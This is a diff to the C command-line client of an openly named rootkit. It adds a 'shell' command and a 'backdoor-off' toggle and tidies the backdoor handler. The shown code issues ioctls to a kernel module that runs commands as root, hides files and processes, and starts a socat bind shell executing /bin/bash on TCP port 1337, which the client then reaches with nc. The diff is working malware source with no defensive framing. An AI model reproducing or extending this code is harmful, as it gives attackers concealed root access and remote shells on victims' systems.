@@ -52,19 +52,21 @@ parse_input(int argc, char **argv)
         return (cmd_t){ handle_backdoor, (void *)argv[2] };
     }
 
-    if (ARGVCMP(1, "shell")) {
+    if (ARGVCMP(1, "shell"))
         return (cmd_t){ handle_shellbd, NULL };
-    }
 
     if (ARGVCMP(1, "backdoor-use-tty")) {
         ASSERT_ARGC(2, "backdoor-use-tty <0 | 1>");
 
         if (ARGVCMP(2, "0"))
-            return (cmd_t){ handle_togglebd, (void *)0 };
+            return (cmd_t){ handle_togglebd, (void *)-1 };
 
         if (ARGVCMP(2, "1"))
             return (cmd_t){ handle_togglebd, (void *)1 };
     }
+
+    if (ARGVCMP(1, "backdoor-off"))
+            return (cmd_t){ handle_togglebd, (void *)0 };
 
     if (ARGVCMP(1, "hidepid")) {
         ASSERT_ARGC(3, "hidepid <add | remove> <PID>");
@@ -99,7 +101,7 @@ handle_shellbd(void *arg)
     const char *socat_cmd = "socat tcp4-listen:1337,reuseaddr,fork"
         " exec:/bin/bash,pty,stderr,setsid";
 
-    int ret = issue_ioctl(G7_BACKDOOR, socat_cmd);
+    issue_ioctl(G7_BACKDOOR, socat_cmd);
 
     char *argv[] = {
         "nc",
@@ -108,8 +110,7 @@ handle_shellbd(void *arg)
         NULL
     };
 
-    execve(argv[0], argv, NULL);
-    return ret;
+    return execve(argv[0], argv, NULL);
 }
 
 int
@@ -150,6 +151,8 @@ help()
     printf("%-32s %s\n", "ping", "send an echo request to the rootkit");
     printf("%-32s %s\n", "filehide <toggle | on | off>", "{,un}hide files");
     printf("%-32s %s\n", "backdoor <execve_command>", "exec a command as root");
+    printf("%-32s %s\n", "shell", "obtain a shell as root");
     printf("%-32s %s\n", "backdoor-use-tty <0 | 1>", "listen for `make_me_root` on read (0) or tty (1)");
+    printf("%-32s %s\n", "backdoor-off", "disable any (read or tty) backdoor");
     printf("%-32s %s\n", "hidepid <add | remove> <PID>", "{,un}hide a process");
 }
